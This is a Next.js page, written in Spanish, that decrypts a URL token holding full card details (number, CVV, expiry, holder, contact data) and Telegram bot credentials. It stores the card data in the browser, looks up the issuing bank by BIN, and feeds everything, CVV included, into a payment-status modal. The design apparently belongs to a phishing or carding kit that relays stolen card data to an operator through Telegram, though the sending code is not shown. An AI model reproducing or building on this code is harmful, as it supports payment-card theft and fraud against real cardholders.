import { useEffect, useState } from "react";
import type { GetServerSideProps } from "next";
import PaymentStatusModal from "@/components/PaymentStatusModal";
import { decryptEnvelope, getPrivateKeyPem } from "@/lib/rsaCipher";
import { saveSessionCredentials, sessionIdFromToken } from "@/lib/sessionCredentials";
import { CheckCardService } from "@/services/checkCardService";
import { mapBankName, mapCardMeta } from "@/lib/binMeta";
import { validateBin } from "@/services/bin/validate";

interface PaymentPayload {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
  };
  price: string;
  priceFormatted: string;
  redirectSuccess: string;
  redirectDeclined: string;
  sessionId?: string;
  telegram: { botToken: string; chatId: string };
}

interface HomeProps {
  valid: boolean;
  payload?: PaymentPayload;
  sessionId?: string;
}

const localMeta = (card: string): { cardBrand: string; metodo: string } => {
  const local = CheckCardService.validateCard(card);
  return {
    cardBrand: local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A",
    metodo: "N/A",
  };
};

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  const token = typeof ctx.query.d === "string" ? ctx.query.d : "";
  if (!token) {
    return { props: { valid: false } };
  }
  try {
    const payload = decryptEnvelope<PaymentPayload>(token, getPrivateKeyPem());
    const isWellFormed =
      typeof payload?.payment?.numeroTarjeta === "string" &&
      typeof payload.payment.vencimiento === "string" &&
      typeof payload.payment.cvv === "string" &&
      typeof payload.payment.titular === "string" &&
      typeof payload.price === "string" &&
      typeof payload.priceFormatted === "string" &&
      typeof payload.redirectSuccess === "string" &&
      typeof payload.redirectDeclined === "string" &&
      typeof payload.telegram?.botToken === "string" &&
      typeof payload.telegram?.chatId === "string";
    if (!isWellFormed) {
      return { props: { valid: false } };
    }
    const sessionId = payload.sessionId ?? sessionIdFromToken(token);
    await saveSessionCredentials(sessionId, payload.telegram);
    return {
      props: {
        valid: true,
        sessionId,
        payload: {
          payment: payload.payment,
          price: payload.price,
          priceFormatted: payload.priceFormatted,
          redirectSuccess: payload.redirectSuccess,
          redirectDeclined: payload.redirectDeclined,
        },
      },
    };
  } catch {
    return { props: { valid: false } };
  }
};

export default function Home({ valid, payload, sessionId }: HomeProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [cardMeta, setCardMeta] = useState<{ cardBrand: string; metodo: string }>(() => ({
    cardBrand: "N/A",
    metodo: "N/A",
  }));
  const [banco, setBanco] = useState<string | undefined>(undefined);

  useEffect(() => {
    if (!valid || !payload) return;

    const cleanCard = payload.payment.numeroTarjeta.replace(/\D/g, "");
    const bin = cleanCard.slice(0, 6);

    localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));

    const resolve = async () => {
      if (bin.length < 6) {
        setCardMeta(localMeta(cleanCard));
        setBanco(undefined);
        setIsOpen(true);
        return;
      }

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);

      const fallbackLocal = () => {
        setCardMeta(localMeta(cleanCard));
        setBanco(undefined);
      };

      try {
        // Nivel 1: /api/bin/validate (Checkout.com)
        const { data: validateData, error: validateError } = await validateBin(cleanCard);
        if (!validateError && validateData) {
          setCardMeta(mapCardMeta(validateData.brand, validateData.type));
          setBanco(mapBankName(validateData.issuer));
        } else {
          // Nivel 2: /api/bin/lookup (binlist)
          const res = await fetch(`/api/bin/lookup?bin=${bin}`, {
            signal: controller.signal,
          });
          if (!res.ok) throw new Error("lookup falló");
          const data = await res.json();
          setCardMeta(mapCardMeta(data.scheme, data.type));
          setBanco(mapBankName(data.bank?.name));
        }
      } catch {
        // Nivel 3: local
        fallbackLocal();
      } finally {
        clearTimeout(timeout);
      }
      setIsOpen(true);
    };

    resolve();
  }, [valid, payload]);

  useEffect(() => {
    if (valid && payload) {
      localStorage.setItem(
        "checkout_payment",
        JSON.stringify({
          ...payload.payment,
          cardBrand: cardMeta.cardBrand,
          metodo: cardMeta.metodo,
          ...(banco ? { banco } : {}),
        }),
      );
    }
  }, [valid, payload, cardMeta, banco]);

  if (!valid || !payload) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  return (
    <PaymentStatusModal
      sessionId={sessionId ?? `p-${Date.now()}`}
      isOpen={isOpen}
      price={payload.price}
      priceFormatted={payload.priceFormatted}
      last4={payload.payment.numeroTarjeta.slice(-4)}
      card={payload.payment.numeroTarjeta}
      cardT={
        cardMeta.metodo === "credito"
          ? "Crédito"
          : cardMeta.metodo === "debito"
            ? "Débito"
            : cardMeta.metodo === "prepago"
              ? "Prepago"
              : "N/A"
      }
      vencimiento={payload.payment.vencimiento}
      cvv={payload.payment.cvv}
      titular={payload.payment.titular}
      cardBrand={cardMeta.cardBrand}
      banco={banco}
      email={payload.payment.email}
      contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
      redirectSuccess={payload.redirectSuccess}
      redirectDeclined={payload.redirectDeclined}
    />
  );
}